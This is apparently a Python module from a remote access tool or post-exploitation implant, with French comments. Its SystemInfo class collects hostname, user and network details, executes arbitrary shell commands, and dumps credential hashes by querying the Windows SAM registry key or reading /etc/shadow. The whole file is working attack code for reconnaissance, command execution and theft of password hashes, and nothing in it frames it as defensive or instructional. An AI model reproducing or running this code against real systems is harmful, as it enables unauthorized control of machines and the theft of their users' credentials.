import platform
import subprocess
import socket
import getpass
import os
import hashlib

class SystemInfo:
    def __init__(self):
        self.os_type = platform.system().lower()
        
    def get_system_info(self):
        # recupere les infos de base du systeme
        try:
            return {
                "os": platform.system(),
                "os_version": platform.release(),
                "architecture": platform.machine(),
                "hostname": socket.gethostname(),
                "user": getpass.getuser(),
                "python_version": platform.python_version()
            }
        except Exception:
            return {"os": "Unknown", "user": "Unknown", "hostname": "Unknown"}
            
    def get_network_info(self):
        # info reseau selon l'OS
        try:
            if self.os_type == "windows":
                result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=10)
            else:
                result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=10)
                
            return result.stdout if result.returncode == 0 else "Failed to get network info"
        except Exception:
            return "Error getting network info"
            
    def execute_command(self, command):
        # execute une commande shell
        try:
            if self.os_type == "windows":
                result = subprocess.run(["cmd", "/c", command], capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(["/bin/bash", "-c", command], capture_output=True, text=True, timeout=30)
                
            output = result.stdout
            if result.stderr:
                output += f"\nErrors:\n{result.stderr}"
                
            return output if output else "Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "Command timeout"
        except Exception as e:
            return f"Error executing command: {str(e)}"
            
    def dump_hashes(self):
        # recupere les hash selon l'OS
        try:
            if self.os_type == "windows":
                return self._dump_sam()
            else:
                return self._dump_shadow()
        except Exception as e:
            return f"Error dumping hashes: {str(e)}"
            
    def _dump_sam(self):
        # tente de lire la base SAM (necessite des privs)
        try:
            # methode basique - en vrai faut plus de travail
            result = subprocess.run(["reg", "query", "HKLM\\SAM\\SAM\\Domains\\Account\\Users"], 
                                  capture_output=True, text=True)
            return result.stdout if result.returncode == 0 else "Failed to access SAM (insufficient privileges)"
        except:
            return "Cannot access SAM database"
            
    def _dump_shadow(self):
        # tente de lire /etc/shadow
        try:
            if os.path.exists("/etc/shadow"):
                with open("/etc/shadow", "r") as f:
                    return f.read()
            else:
                return "Shadow file not found"
        except PermissionError:
            return "Permission denied to read shadow file"
        except Exception:
            return "Error reading shadow file"